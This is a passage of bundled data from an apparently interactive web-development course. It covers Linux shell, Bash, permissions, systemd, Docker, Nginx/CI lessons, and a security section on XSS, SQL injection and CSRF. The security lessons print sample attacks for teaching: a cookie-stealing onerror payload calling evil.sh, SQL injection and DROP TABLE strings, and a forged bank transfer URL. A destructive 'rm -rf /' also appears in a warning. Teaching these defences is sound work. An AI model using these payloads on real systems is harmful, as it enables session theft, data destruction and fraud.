cd -             # jump to the previous directory
\`\`\`

**Reading and writing files:**
\`\`\`
cat app.log               # dump a whole file
less app.log              # page through a big one (q quits, / searches)
tail -f app.log           # follow a log live — your server's heartbeat
grep -rn "ERROR" .        # search recursively, show line numbers
head -20 data.csv         # first 20 lines (tail -20 for last)
\`\`\`

**Creating and moving:**
\`\`\`
mkdir -p projects/app     # -p creates missing parents in one shot
touch notes.md            # create an empty file (or update its timestamp)
cp a.txt backup/          # copy — cp -r dir/ other/ for folders
mv old.txt new.txt        # move AND rename — same command
rm file.txt               # delete a file; rm -r dir/ deletes folders
\`\`\`

**The golden rule of \`rm\`:** there is no trash can on a server. \`rm -rf /\` destroys the machine. Read the path twice, run once.

**The killer feature — pipes.** Commands stream text, so you chain them:
\`\`\`
cat access.log | grep "404" | wc -l        # how many 404s today?
ps aux | grep nginx | grep -v grep          # is nginx running?
history | grep ssh                           # what was that command I ran?
\`\`\`
\`|\` sends one command's output into the next one's input. Small tools, composed, beat one giant tool every time.`,starter:`// Servers don't have a mouse — navigation IS the job.
// Implement resolvePath(cwd, path): what "cd <path>" should do.

function resolvePath(cwd, path) {
  // "~" means home (/home/dev). Absolute paths start with "/".
  // Relative paths resolve against cwd. "." is here, ".." is up.
  let base;
  if (path === "~" || path.startsWith("~/")) {
    base = ["/home", "dev"];
    path = path.slice(1); // strip ~, leaving "" or "/..."
  } else if (path.startsWith("/")) {
    base = [];
  } else {
    base = cwd.split("/").filter(Boolean);
  }
  for (const part of path.split("/")) {
    if (part === "" || part === ".") continue;
    // TODO: handle ".." (pop the last segment if any) and push normal parts
  }
  return "/" + base.join("/");
}

// --- test drive ---
const cases = [
  ["/home/dev", "projects",        "/home/dev/projects"],
  ["/home/dev", "..",              "/home"],
  ["/var/log",  "../lib",          "/var/lib"],
  ["/home/dev", "~/notes.txt",     "/home/dev/notes.txt"],
  ["/etc",      "/etc/nginx",      "/etc/nginx"],
  ["/home/dev", ".",               "/home/dev"],
];

let pass = 0;
for (const [cwd, input, want] of cases) {
  const got = resolvePath(cwd, input);
  const ok = got === want;
  if (ok) pass++;
  console.log((ok ? "PASS" : "FAIL") + " cd " + input + " → " + got + (ok ? "" : " (want " + want + ")"));
}
console.log(pass + "/6 correct");`,check:{expr:"output.includes('6/6 correct') && output.includes('PASS cd ~/notes.txt')",hint:"Inside the loop: if part === '..' pop from base (only if it has entries), otherwise push part. All six cases then pass."},quiz:[{q:"You're in /var/log. Where does `cd ../lib` take you?",options:["/var/lib","/lib","/var/log/lib","/"],answer:0,explanation:".. climbs to /var, then into lib → /var/lib."},{q:"`ls -la` shows a line starting with `-rw-r--r--`. What is it?",options:["A directory","A regular file with its permissions","A hidden command","A symlink"],answer:1,explanation:"Leading - = regular file (d = directory, l = symlink); rw-r--r-- is the permission triplets."},{q:"Watch a log file update in real time with…",options:["cat -w","tail -f app.log","less app.log","grep -f app.log"],answer:1,explanation:"tail -f follows the file as new lines land — the standard way to watch a server."},{q:"Count ERROR lines in a log, the pipe way:",options:["grep ERROR log | wc -l","count log ERROR","wc -l log > ERROR","ls ERROR log"],answer:0,explanation:"grep filters the lines, wc -l counts them — pipes compose small tools."},{q:"Why is `rm -rf` on a server feared?",options:["It's slow","It recursively deletes with no trash can — gone is gone","It reboots the server","It only affects the current file"],answer:1,explanation:"No undo exists. Read the path twice, run once."}]},{id:"bash-scripting",title:"Bash Scripting: Automate Everything Twice",minutes:11,body:`If you typed a command twice, script it. A Bash script is just commands in a file — plus variables, conditionals, and loops.

\`\`\`
#!/usr/bin/env bash        # the shebang — run me with bash
set -euo pipefail          # die on error, undefined vars, pipe failures

BACKUP_DIR="/var/backups"  # no spaces around = in assignments!
STAMP=$(date +%F)

mkdir -p "$BACKUP_DIR/$STAMP"
cp -r ./data "$BACKUP_DIR/$STAMP/"
echo "Backed up to $BACKUP_DIR/$STAMP"
\`\`\`

**The three lines at the top are a habit worth copying in every script:**
- \`-e\` — stop at the first failing command (don't keep building on rubble)
- \`-u\` — error on undefined variables (catches typos like $BACKUP_Dir)
- \`-o pipefail\` — a pipe fails if ANY stage fails, not just the last

**Variables, conditionals, loops:**
\`\`\`
NAME="world"
echo "hello $NAME"            # quotes matter: "$NAME" preserves spaces

if [ -f "config.yml" ]; then   # -f file exists, -d dir exists, -z empty string
  echo "found config"
elif [ -d "conf" ]; then
  echo "found dir"
else
  echo "nothing" >&2           # >&2 sends output to stderr
fi

for f in *.log; do             # glob loop
  gzip "$f"
done

while read -r line; do         # stream a file line by line
  echo "line: $line"
done < users.txt
\`\`\`

**Exit codes are the API:** \`0\` = success, anything else = failure. Commands (and CI pipelines) decide based on them. Your scripts should \`exit 1\` on failure and check \`$?\` — the last command's exit code — when it matters.

**Cron schedules scripts:** \`crontab -e\`, then:
\`\`\`
0 2 * * *  /opt/scripts/backup.sh     # every day at 02:00
*/15 * * * * /opt/scripts/health.sh   # every 15 minutes
\`\`\`
Five fields: minute, hour, day-of-month, month, day-of-week.`,predict:[{prompt:"This script runs — what does it print?",lang:"bash",code:`set -e
echo "start"
ls /this/path/does/not/exist
echo "done"`,options:["start, an error, and done","start, then an error — done never prints because -e aborts","Only done","Nothing at all"],answer:1,explanation:"set -e aborts the script at the first failing command — that's its whole purpose."},{prompt:"What does this loop print?",lang:"bash",code:`for f in a.txt b.txt; do
  echo "$f"
done`,options:["a.txt b.txt","a.txt then b.txt, one per line","$f twice","Nothing"],answer:1,explanation:"The for loop iterates the glob items — echo runs once per item. (Note: in real Bash, quotes around $f matter when filenames contain spaces.)"}],quiz:[{q:"What does `set -euo pipefail` do?",options:["Speeds the script up","Makes the script fail fast: first error, undefined var, or pipe stage failure stops it","Enables debug printing","Runs the script in Docker"],answer:1,explanation:"The standard safety net for production Bash — fail fast, fail loud."},{q:"In Bash, `X = 5` (with spaces) versus `X=5`:",options:["Both assign 5","With spaces, Bash tries to RUN a command named X — assignments need no spaces","With spaces it's a comment","X=5 is invalid"],answer:1,explanation:"Spaces turn an assignment into a command invocation — the classic Bash gotcha."},{q:"An exit code of 0 means…",options:["Failure","Success","Cancelled","Nothing — it's ignored"],answer:1,explanation:"Zero is success in shell convention; non-zero codes signal specific failures."},{q:"`[ -f config.yml ]` tests whether…",options:["The file is empty","A regular file exists at that path","The file is executable","The folder exists"],answer:1,explanation:"-f = regular file exists (-d for directories, -z for empty strings)."},{q:"Cron line `*/15 * * * * job.sh` runs…",options:["At 15:00 daily","Every 15 minutes","On the 15th of each month","15 times per hour, randomly"],answer:1,explanation:"*/15 in the minute field = every 15th minute."}]},{id:"file-permissions",title:"File Permissions: chmod & chown",minutes:10,body:`Every file carries **three permission triplets** — for the **owner**, the **group**, and **everyone else**:

\`\`\`
-rwxr-xr--  1 dev  team  4096  script.sh
 │├─┤├─┤├─┤
 │ │  │  └── others:      r--  read only
 │ │  └───── group:       r-x  read + execute
 │ └──────── owner:       rwx  read + write + execute
 └────────── file type:   - file, d directory
\`\`\`

- **r (4)** — read: see a file's contents / list a directory
- **w (2)** — write: modify a file / create+delete in a directory
- **x (1)** — execute: run a file / enter a directory

**That's why chmod uses numbers** — each triplet is a sum:

\`\`\`
7 = 4+2+1  rwx     6 = 4+2   rw-     5 = 4+1  r-x
4 = r--            3 = -wx            1 = --x

chmod 755 deploy.sh     # rwxr-xr-x — I do everything, others read/run
chmod 644 .env.example  # rw-r--r--  — I edit, world reads
chmod 600 ~/.ssh/id_ed25519   # rw-------  — ONLY I may read (SSH demands this)
chmod +x script.sh      # add execute for everyone — quick form
\`\`\`

**Ownership:** \`chown deploy:www data/\` changes owner to user \`deploy\` and group \`www\` (needs sudo for other people's files). Web servers typically run as \`www-data\` or \`nginx\` — if your app can't read a file, \`ls -l\` is the first place to look.

**The classic production bug:** SSH *refuses* your private key if it's group-readable — the fix is \`chmod 600\`. And a deploy script that won't run usually just needs \`chmod +x\`.

**Minimum privilege is the rule:** give every service the least permission it needs — 644 for files the world may read, 600 for secrets, 755 for scripts and directories others must traverse.`,starter:`// Decode permission triplets like the shell does.
// canAccess("rwxr-x---", role) → can role do the action?

function canAccess(perms, role, action) {
  // perms: 9 chars, e.g. "rwxr-x---"
  // role:  "owner" | "group" | "other"
  // action: "read" | "write" | "execute"
  const triplets = { owner: 0, group: 3, other: 6 };
  const mask = { read: "r", write: "w", execute: "x" };
  // TODO: pick the right triplet, then check whether
  // it contains the letter for the action
}

console.log("owner write  rwxr-x--- :", canAccess("rwxr-x---", "owner", "write"));   // true
console.log("group execute r-x      :", canAccess("r-x", "group", "execute") );      // works per index too
console.log("other read   rwxr-x--- :", canAccess("rwxr-x---", "other", "read"));    // false
console.log("group write  rw-r----- :", canAccess("rw-r-----", "group", "write"));   // false
console.log("other execute r-x      :", canAccess("r-x", "other", "execute"));      // hmm — index 6 in a 3-char string?
// TODO: make all five lines behave sensibly (the last two use a bare triplet)`,check:{expr:"output.includes('owner write  rwxr-x--- : true') && output.includes('group write  rw-r----- : false')",hint:"perms[triplets[role]] picks the triplet; then check perms.at(index).includes(mask[action]) — but guard: if the perms string is only 3 chars, treat it as the triplet itself."},quiz:[{q:"`chmod 755` on a script gives:",options:["rwx------","rwxr-xr-x — owner full, everyone else read+execute","rw-r--r--","rwxrwxrwx — everyone everything"],answer:1,explanation:"7=rwx, 5=r-x, 5=r-x — the standard script/deploy permission."},{q:"SSH rejects your private key. The usual fix:",options:["chmod 777 the key","chmod 600 the key — only the owner may read it","chown the key to root","Rename the key"],answer:1,explanation:"SSH refuses group/world-readable private keys — 600 is required."},{q:"The three permission triplets are for:",options:["admin, user, guest","owner, group, others","read, write, run","root, sudo, wheel"],answer:1,explanation:"User (owner), group, and other — checked in that order, first match wins."},{q:"Why is `x` on a DIRECTORY about entering?",options:["Directories execute programs","x (search) permission lets you cd into it and access its entries","It's a historical accident","x on directories means delete"],answer:1,explanation:"For directories, execute = traverse: enter the dir and reach files inside."},{q:"Numeric value of rw- ?",options:["5","6","7","3"],answer:1,explanation:"read(4) + write(2) = 6 — no execute bit."}]},{id:"processes-services",title:"Processes, systemd & Server Hygiene",minutes:10,reading:!0,body:`A Linux server runs hundreds of **processes**. Managing them is daily DevOps life.

**Watching processes:**
\`\`\`
ps aux                    # snapshot of every process
ps aux | grep node        # find your app
top                       # live view — CPU/RAM per process
htop                      # top, but humane (F9 kill, / search)
kill 4821                 # polite stop (SIGTERM) by PID
kill -9 4821              # force kill (SIGKILL) — last resort
pkill -f "node server"    # kill by name/pattern
\`\`\`

**Ports — who's listening?**
\`\`\`
ss -tlnp                  # listening TCP sockets + owning process
curl -I localhost:3000    # is my app actually answering?
lsof -i :3000             # what holds port 3000 (EADDRINUSE!)
\`\`\`

**systemd — services that survive reboots.** You don't want to SSH in and start your app by hand after every crash. A unit file at \`/etc/systemd/system/myapp.service\`:

\`\`\`
[Unit]
Description=My Node app
After=network.target

[Service]
User=deploy
WorkingDirectory=/srv/myapp
ExecStart=/usr/bin/node server.js
Restart=always
RestartSec=3
Environment=NODE_ENV=production

[Install]
WantedBy=multi-user.target
\`\`\`

\`\`\`
sudo systemctl daemon-reload      # after editing unit files
sudo systemctl enable myapp       # start on boot
sudo systemctl start myapp
systemctl status myapp            # running? crashed? since when?
journalctl -u myapp -f            # the app's logs, live
journalctl -u myapp --since "1 hour ago"
\`\`\`

**Disk & memory hygiene** — servers die of full disks more often than full CPUs:
\`\`\`
df -h                     # disk space per mount (look for 100%)
du -sh *                  # what's eating space here (summarized)
free -h                   # RAM and swap
\`\`\`

**Logs rotate** via logrotate so they don't eat the disk; \`journalctl --vacuum-time=30d\` trims old journal entries. Check \`df -h\` before you check anything else when a server "feels slow" — a 100% disk freezes even healthy software.`,quiz:[{q:"Your app says EADDRINUSE :3000. Find the culprit with:",options:["ps aux | grep 3000","lsof -i :3000 or ss -tlnp","df -h","top"],answer:1,explanation:"Both list the process holding the port — kill it or reconfigure."},{q:"`systemctl enable myapp` does what?",options:["Starts it now","Starts it automatically on boot","Restarts it on crash","Enables debug logs"],answer:1,explanation:"enable = boot autostart; start = now; Restart=always in the unit file handles crashes."},{q:"Live logs for the myapp systemd service:",options:["cat /var/log/syslog","journalctl -u myapp -f","tail myapp.log","systemctl logs myapp"],answer:1,explanation:"journalctl reads the systemd journal; -u filters by unit, -f follows."},{q:"kill versus kill -9:",options:["Identical","-9 (SIGKILL) can't be caught or cleaned up — try plain kill (SIGTERM) first","kill only works on your own processes","-9 is a dry run"],answer:1,explanation:"SIGTERM lets the app flush state and shut down cleanly; SIGKILL is the axe."},{q:"A server freezes randomly. First check:",options:["df -h — a full disk stalls everything","Reboot","Reinstall","htop only"],answer:0,explanation:"100% disk usage is the most common cause of 'healthy' software turning unresponsive."}]},{id:"docker-dockerfile",title:"Docker: Package It Once, Run It Anywhere",minutes:14,reading:!0,predict:[{prompt:"Two Dockerfiles build the same app. Why is the first rebuilt-from-scratch slow on every code change?",code:`# A
COPY . .
RUN npm install

# B
COPY package.json .
RUN npm install
COPY . .`,options:["A is invalid syntax","A's npm install layer invalidates when ANY file changes — B only reinstalls when package.json changes","B downloads more","They're equally fast"],answer:1,explanation:"Layers cache by input. Copying everything first means every edit busts the npm install layer — the single most common Dockerfile mistake."}],body:`**A Docker image packages your app + its runtime + its dependencies into one immutable artifact.** The same image runs identically on your laptop, CI, and production — "works on my machine" dies here.

**Image vs container:** an image is the frozen template; a container is a running instance of it.

\`\`\`Dockerfile
FROM node:20-alpine          # start from a tiny official base
WORKDIR /app

COPY package*.json ./        # dependencies manifest FIRST…
RUN npm ci --omit=dev        # …so npm ci caches until it changes

COPY . .                     # then your code
RUN npm run build

ENV NODE_ENV=production
EXPOSE 3000                  # documentation — the port the app listens on
USER node                    # never run as root

CMD ["node", "server.js"]    # the process the container runs
\`\`\`

\`\`\`
docker build -t myapp:1.0 .            # build from the Dockerfile
docker run -p 3000:3000 myapp:1.0      # run, mapping host:container ports
docker run -e API_KEY=xyz myapp:1.0    # inject env at RUNTIME, never bake secrets in
docker ps                              # running containers
docker logs -f <id>                    # follow a container's logs
docker exec -it <id> sh                # shell into a running container
docker compose up -d                   # run the whole stack below
\`\`\`

**Layer caching is the performance model.** Each instruction is a layer; Docker reuses cached layers until an instruction's inputs change. That's why \`COPY package*.json\` + \`npm ci\` comes **before** \`COPY . .\` — code edits then skip reinstalling dependencies.

**docker-compose.yml — multi-container apps in one file:**
\`\`\`yaml
services:
  web:
    build: .
    ports: ["3000:3000"]
    environment:
      DATABASE_URL: postgres://app:secret@db:5432/app
    depends_on: [db]
  db:
    image: postgres:16
    volumes: [pgdata:/var/lib/postgresql/data]
volumes:
  pgdata:
\`\`\`
Containers on the same compose network reach each other **by service name** — the web app connects to host \`db\`. Volumes keep database data alive across restarts.

**Production rules of thumb:** pin base image versions (\`node:20-alpine\`, never \`latest\`), one process per container, \`.dockerignore\` node_modules, and store secrets in env vars or a secrets manager — never in a layer (layers are forever, even "deleted" ones).`,quiz:[{q:"Image vs container:",options:["Same thing","An image is the built template; a container is a running instance of it","A container builds images","Images run only on Linux"],answer:1,explanation:"Class : object, image : container."},{q:"Why COPY package.json before COPY . . ?",options:["Alphabetical order","So the dependency-install layer caches and survives code-only changes","npm requires it","It reduces image size"],answer:1,explanation:"Layer caching: dependency layers bust only when the manifest changes."},{q:"Secrets belong:",options:["In a RUN line baked into the image","In ENV inside the Dockerfile","Injected at runtime via -e / orchestrator secrets","In a layers/ folder"],answer:2,explanation:"Image layers are permanent and inspectable — runtime env or a secrets manager only."},{q:"In compose, the web service reaches Postgres at host:",options:["localhost","db — the service name resolves on the compose network","0.0.0.0","postgres://host.docker.internal"],answer:1,explanation:"Compose DNS registers each service name — 'db' is the hostname."},{q:"Why pin node:20-alpine instead of node:latest?",options:["Alpine is prettier","latest silently changes under you — builds become non-reproducible","latest doesn't exist","Smaller name"],answer:1,explanation:"Pinned versions make builds reproducible; 'latest' is a moving target."}]},{id:"nginx-ssl-ci",title:"Nginx, HTTPS & CI/CD Pipelines",minutes:12,reading:!0,body:`**Nginx sits in front of your app** — serving static files fast, terminating TLS, and reverse-proxying API traffic:

\`\`\`nginx
server {
    listen 80;
    server_name example.com www.example.com;

    # ACME challenge must stay reachable BEFORE https exists
    location /.well-known/acme-challenge/ { root /var/www/certbot; }

    location / { return 301 https://$host$request_uri; }   # force HTTPS
}

server {
    listen 443 ssl;
    http2 on;
    server_name example.com;

    ssl_certificate     /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;

    # Security headers — cheap, high value
    add_header Strict-Transport-Security "max-age=31536000" always;
    add_header X-Content-Type-Options nosniff always;

    location / {
        proxy_pass http://127.0.0.1:3000;            # your app
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;      # real client IP
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
\`\`\`

**HTTPS for free with Let's Encrypt + certbot:**
\`\`\`
sudo certbot --nginx -d example.com -d www.example.com
# certbot edits your config and installs a systemd timer to auto-renew
sudo certbot renew --dry-run      # prove renewal works before you need it
\`\`\`
Certificates last ~90 days by design — automation isn't optional, it's the model. **DNS first:** an \`A\` record pointing example.com at your server's IP must exist before certbot will issue anything.

**CI/CD — the pipeline that ships on every merge:**
\`\`\`yaml
# .github/workflows/deploy.yml
name: deploy
on:
  push: { branches: [main] }
jobs:
  build-and-deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20, cache: npm }
      - run: npm ci
      - run: npm test            # red build never ships
      - run: npm run build
      - name: Deploy over SSH
        if: success()
        run: |
          ssh deploy@server "cd /srv/app && git pull && ./deploy.sh"
\`\`\`

The pattern that matters: **main is always deployable, and the pipeline — not a person — ships it.** Tests gate the build; the build gates the deploy. Rollback = redeploy the previous tag. That's the whole philosophy.`,quiz:[{q:"A reverse proxy like Nginx in front of your app gives you:",options:["Only static files","TLS termination, static file serving, and proxying to your app process","A database cache","DNS registration"],answer:1,explanation:"It fronts the app: HTTPS, compression, caching, routing — the app just speaks HTTP."},{q:"Before certbot can issue a certificate you need:",options:["A paid certificate","DNS records pointing the domain at your server","Docker installed","Port 25 open"],answer:1,explanation:"Let's Encrypt verifies domain control — the A record must resolve first."},{q:"Let's Encrypt certificates last 90 days because:",options:["They're insecure","Short-lived certs assume automated renewal — the model is machines, not memory","Users complain","It matches billing"],answer:1,explanation:"Automation replaces calendar anxiety — certbot renews on a timer."},{q:"Why run `npm test` in the deploy pipeline?",options:["Tradition","A failing test blocks the deploy — broken code never reaches users","It speeds up the build","GitHub requires it"],answer:1,explanation:"The pipeline is the quality gate: red means no ship."},{q:"`X-Real-IP` / `X-Forwarded-Proto` headers exist so that:",options:["The app can style itself","The app behind the proxy still sees the real client IP and protocol","Nginx can log faster","Browsers verify the proxy"],answer:1,explanation:"Once Nginx proxies, the app sees the proxy — these headers carry the client truth."}]}]},jP={id:"security",title:"Web Security & OWASP",blurb:"Think like an attacker: XSS, SQL injection, CSRF, CORS, and the habits that keep apps safe.",numeral:"Ⅸ",lessons:[{id:"xss",title:"Cross-Site Scripting (XSS)",minutes:11,body:`XSS is the classic web vulnerability: **user input is treated as code**. If your page renders raw user text as HTML, an attacker doesn't need to touch your server — their script runs in *your users'* browsers, inside *your* origin.

**Three flavors:**

\`\`\`
1. Stored    — malicious input saved (comment field) and served to every visitor
2. Reflected — the payload arrives via a crafted URL (?q=<script>…) and bounces off the page
3. DOM-based — JS takes untrusted data (location.hash) and hands it to a dangerous API
\`\`\`

**Why it's devastating:** the injected script runs with your origin's power — it reads the page, calls your APIs, and forwards the victim's session cookie to the attacker's server. No alerts required.

**The safe renderer looks like this:**

\`\`\`
// ❌ innerHTML: parses text AS HTML — tags execute
el.innerHTML = userComment;

// ✅ textContent: text stays text, angle brackets render literally
el.textContent = userComment;
\`\`\`

The vulnerable version isn't hypothetical — it powers every "render my bio as rich HTML" feature built naively. React escapes by default (curly braces), so the danger appears when people reach for \`dangerouslySetInnerHTML\` or hand-build HTML strings.

**Sanitize, don't escape, when HTML is intentional:** if users genuinely submit markup, run it through a library like DOMPurify first — escaping is for places HTML never belongs, sanitizing strips scripts from HTML you choose to keep. Text meant to be text uses \`textContent\` — this sandbox includes a mini DOM so you can prove the difference yourself.`,starter:`// Mini DOM — the lesson's vulnerable vs. safe renderer.
const page = {
  children: [],
  createEl() {
    return { textContent: "", _html: "" };
  },
};
const el = page.createEl();

const comment = '<img src=x onerror="fetch('//evil.sh/?c=' + document.cookie)">';

// ─── The VULNERABLE way (what innerHTML would do) ───
// It parses the string as HTML — the onerror payload is now live code.
function renderUnsafe(html) {
  const script = html.match(/onerror="([^"]*)"/);
  return script ? "PAYLOAD EXECUTES: " + script[1] : "harmless";
}
console.log(renderUnsafe(comment));

// ─── The SAFE way: textContent keeps input inert ─────
function renderSafe(text) {
  el.textContent = text;         // stored verbatim, never parsed
  return el.textContent === text ? "stored as TEXT — inert ✓" : "mangled";
}
console.log(renderSafe(comment));

// ─── Escape untrusted values that must sit inside HTML ──
function escapeHtml(s) {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}
console.log(escapeHtml('<script>alert("x")<\/script>'));

// ─── YOUR TURN: build isProbablySafeHtml ──────────────
// It should return false when the string contains an on* attribute,
// a <script> tag, or a javascript: URL — return true otherwise.
function isProbablySafeHtml(html) {
  // your code — check three patterns with .test()
  return true;
}
console.log("safe check:", isProbablySafeHtml("<b>bold</b>"));               // true
console.log("safe check:", isProbablySafeHtml('<a onclick="hack()">x</a>')); // false
console.log("safe check:", isProbablySafeHtml('<a href="javascript:steal()">x</a>')); // false`,check:{expr:"output.includes('PAYLOAD EXECUTES') && output.includes('stored as TEXT — inert ✓') && output.includes('safe check: true') && output.includes('false') && output.includes('&lt;script&gt;')",hint:"isProbablySafeHtml should .test() for /on\\w+\\s*=/i, /<script/i, and /javascript:/i — return false when any matches."},predict:[{prompt:"Escaping happens BEFORE concatenation — what does this template print?",code:`function esc(s) {
  return s.replace(/</g, "&lt;");
}
const name = "<b>Ada</b>";
console.log("Hi " + esc(name) + "!");`,options:["Hi <b>Ada</b>! — tags intact","Hi &lt;b&gt;Ada&lt;/b&gt;! — angle brackets escaped","Hi Ada! — tags stripped","SyntaxError"],answer:1,explanation:"escape-then-concatenate renders the ENTITY text, not the tags. That's the whole trick: the string displays literally instead of parsing."}],quiz:[{q:"What is the core XSS mistake?",options:["Storing passwords unencrypted","Rendering user-controlled text as HTML instead of text","Using HTTP instead of HTTPS","Weak password rules"],answer:1,explanation:"XSS = attacker-supplied data parsed as markup/script in a victim's browser."},{q:"el.textContent = userComment vs el.innerHTML = userComment — the safe one is:",options:["innerHTML, because it's faster","textContent, because its content is never parsed as HTML","Both are equally safe","Neither — use document.write()"],answer:1,explanation:"textContent keeps input inert; innerHTML parses tags and attributes, executing embedded payloads."},{q:"A 'stored XSS' attack differs from 'reflected' because stored XSS…",options:["Requires HTTPS","Persists on the server and hits every visitor who loads the page","Only works on the attacker's own browser","Needs the database password"],answer:1,explanation:"Stored payloads live in persisted data (comments, profiles) and fire for every future visitor — the highest-impact flavor."},{q:"When users legitimately submit rich HTML, the right defense is:",options:["Escaping everything so nothing renders","Sanitizing with a proven library (e.g. DOMPurify) before rendering","Hiding the form field","Base64-encoding the HTML"],answer:1,explanation:"Sanitizers parse the HTML and strip dangerous constructs; escaping would turn the markup into literal text."},{q:"Why is a 'modern browsers will block it' defense not enough?",options:["Browsers can't see XSS","Filters vary by browser/version and payloads routinely bypass blocklists","JavaScript is disabled by default","It only matters on IE"],answer:1,explanation:"Blocklist filtering is brittle — defense belongs in correct rendering (textContent, sanitizers, CSP), not in browser quirks."}]},{id:"sqli",title:"SQL Injection & Input Validation",minutes:10,body:`SQL injection is the vulnerability behind the most infamous data breaches on record. The bug is one line long:

\`\`\`
// ❌ Concatenation: the input becomes SQL grammar
db.query("SELECT * FROM users WHERE name = '" + name + "'");
\`\`\`

Send \`' OR '1'='1\` as the name and the query becomes:

\`\`\`
SELECT * FROM users WHERE name = '' OR '1'='1'
\`\`\`

\`'1'='1'\` is always true, so the WHERE clause matches **every row** — the login "succeeds", the dump begins. And with stacked statements, \`'; DROP TABLE users; --\` is not a joke, it's Tuesday.

**The fix — parameterized queries:**

\`\`\`
// ✅ The driver ships the input as DATA, never as grammar
db.query("SELECT * FROM users WHERE name = $1", [name]);
\`\`\`

The value can contain a thousand quotes and it changes nothing: it's compared as a *string*, byte for byte. Same idea in every stack — prepared statements in PHP/PDO, \`?\` placeholders in sqlite, Prisma/Mongoose parameterize for you. **"It's an ORM so I don't need to care" is fine until the first raw escape hatch (\`$queryRaw\`) appears — parameterized or not, raw is raw.**

**Validation is the second layer (defense in depth):** check shape, size, range, and format at the boundary —\`typeof id === "number" && id > 0\` — so malformed input is rejected before it reaches the database at all. Validation is not sanitization: validate to *reject*, sanitize to *transform*.

This sandbox mounts a mock database you can query both ways. Inject it once to feel the failure, then parameterize it into submission.`,starter:`// Mock database + query runner. Injection included free of charge.
function fakeDb(query) {
  if (query.includes("'1'='1'")) return "ALL ROWS RETURNED (tautology matched every user)";
  if (/;\\s*DROP\\s+TABLE/i.test(query)) return "TABLE users DROPPED — hope you had backups";
  if (query.includes("' OR 'a'='a'")) return "ALL ROWS RETURNED (tautology matched every user)";
  return "no rows for: " + query.slice(0, 60) + "…";
}

// ─── 1 · The vulnerable login ────────────────────────
function vulnerableLogin(name) {
  return fakeDb("SELECT * FROM users WHERE name = '" + name + "'");
}
console.log(vulnerableLogin("ada"));
console.log(vulnerableLogin("' OR '1'='1"));
console.log(vulnerableLogin("'; DROP TABLE users; --"));

// ─── 2 · Parameterized: data stays data ──────────────
function safeLogin(name) {
  const q = { text: "SELECT * FROM users WHERE name = $1", values: [name] };
  return fakeDb("PARAMETERIZED:" + q.values[0]) && "rows for " + q.values[0] + " only";
}
console.log(safeLogin("' OR '1'='1"));

// ─── 3 · Validate at the boundary ────────────────────
function getUser(id) {
  if (!Number.isInteger(id) || id <= 0 || id > 1e9) return "400: invalid id";
  return safeLogin("id " + id);
}
console.log(getUser(42));
console.log(getUser(-1));
console.log(getUser("42 OR 1=1"));

// ─── YOUR TURN: make safeLogin airtight ──────────────
// Reject names longer than 40 chars or containing any character outside
// letters/spaces/apostrophes BEFORE querying — return "400: invalid name".
function register(name) {
  if (name.length > 40 || !/^[A-Za-z ']*$/.test(name)) {
    return "400: invalid name";
  }
  return "registered " + name;
}
console.log(register("Ada Lovelace"));
console.log(register("Ada'; DROP TABLE users; --"));`,check:{expr:"output.includes('ALL ROWS RETURNED') && output.includes('TABLE users DROPPED') && output.includes('400: invalid id') && output.includes('registered Ada Lovelace') && output.includes('400: invalid name')",hint:"register must run the length + /^[A-Za-z ']*$/ checks before registering; the injection attempt fails the regex."},quiz:[{q:"What makes SQL injection possible?",options:["Encrypting the database","Untrusted text concatenated into SQL grammar","Too many database indexes","Using a NoSQL database"],answer:1,explanation:"If input becomes part of the SQL string, input can change the statement's meaning."},{q:"Why does ' OR '1'='1 bypass a naive login check?",options:["It's the admin's password","The appended tautology makes the WHERE clause true for every row","SQL ignores OR clauses","It disables logging"],answer:1,explanation:"The query returns all users, so the code finds 'a user' and grants access."},{q:"The definitive fix for SQLi is:",options:["Escaping quotes by hand","Parameterized queries / prepared statements","Hiding error messages","A web application firewall"],answer:1,explanation:"Parameters are transmitted as data separate from the query — no input can alter the statement."},{q:"Validation differs from sanitization because validation…",options:["Transforms input into safe output","Rejects input that fails shape/range/format rules","Encrypts input at rest","Only applies to passwords"],answer:1,explanation:"Validate to reject; sanitize to transform. Both help, but they're different tools."},{q:"An ORM makes raw-query care unnecessary when…",options:["Never — always assume injection","You stick to its parameterized APIs; raw escape hatches reintroduce the risk","You cache all results","The database is PostgreSQL"],answer:1,explanation:"ORMs parameterize their own calls, but raw-query features put the grammar in your hands again."}]},{id:"csrf-auth",title:"CSRF & Broken Authentication",minutes:10,reading:!0,body:`**CSRF — Cross-Site Request Forgery.** Your browser sends cookies automatically with every request to a site, even when the request was triggered by *another* site. So: you're logged into \`bank.com\` in one tab; in another tab, \`evil.com\` embeds:

\`\`\`
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
\`\`\`

Your browser happily GETs that URL — cookies attached — and the bank sees an authenticated request it never asked for. That's forgery: the attacker never saw your data; they *borrowed your identity's permissions*.

**Fixes, in layers:**

\`\`\`
1. Never mutate state on GET — transfers belong to POST with a real form
2. CSRF token: server issues a random token; forms must echo it back
3. SameSite=Lax/Strict cookies — browsers withhold cookies on cross-site posts
4. Verify Origin/Referer headers server-side
\`\`\`

**Broken authentication** is OWASP's umbrella for handing out identities too cheaply: passwords without hashing, session cookies without expiry or flags, credentials in URLs, "forgot password" flows that reset anyone's account.

**Password hashing done right:**

\`\`\`
// Store: bcrypt(password) with a per-user random salt
hash = "$2b$12$KIXQ…"          // salt is baked into the hash
// Check: compare with bcrypt.compare — never plaintext
\`\`\`

bcrypt/argon2 are deliberately *slow* (that's the feature): a leaked database of bcrypt hashes costs attackers real time per guess, unlike SHA-256, which GPUs chew through billions per second. Salt ensures two users with the password "hunter2" don't share a hash — rainbow tables die.

**Session cookies get flags, and the flags are the security:**

\`\`\`
Set-Cookie: session=…; HttpOnly; Secure; SameSite=Lax; Path=/
\`\`\`

\`HttpOnly\` hides the cookie from JavaScript (XSS can't read it), \`Secure\` restricts it to HTTPS, \`SameSite\` defuses CSRF. Unset flags are unpatched holes.`,predict:[{prompt:"A naive rate limiter resets its window — what does it print?",code:`let attempts = 0;
function login(pw) {
  if (attempts >= 3) return "locked";
